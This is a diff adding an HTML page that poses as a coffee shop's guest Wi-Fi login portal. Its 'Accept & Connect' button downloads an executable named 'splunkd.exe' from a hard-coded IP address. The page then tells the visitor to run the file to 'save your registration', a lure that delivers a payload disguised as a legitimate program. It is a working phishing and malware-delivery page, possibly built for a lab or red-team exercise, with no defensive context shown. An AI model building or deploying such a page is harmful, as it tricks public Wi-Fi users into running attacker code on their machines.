@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wi-Fi Login Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+	img {
+		width:150px;
+		height: auto;
+		margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<img src="http://198.18.128.188:8000/coffeelogo.png" alt="Coffee Shop Logo">
+
+    <h1>Welcome to Guest Wi-Fi</h1>
+    <p>Please accept the terms and conditions to connect to the Internet. To proceed, click the button below.</p>
+    <button id="accept-btn">Accept & Connect</button>
+    <p id="instructions" class="hidden">Your connection is ready. Please run the "splunkd.exe" file that was downloaded to save your registration.</p>
+
+    <script>
+        document.getElementById("accept-btn").addEventListener("click", function () {
+            // Trigger the download of splunkd.exe
+            window.location.href = "http://198.18.128.188:8000/splunkd.exe";
+            
+            // Show instructions to the user to manually run the file
+            document.getElementById("instructions").classList.remove("hidden");
+        });
+    </script>
+</body>
+</html>
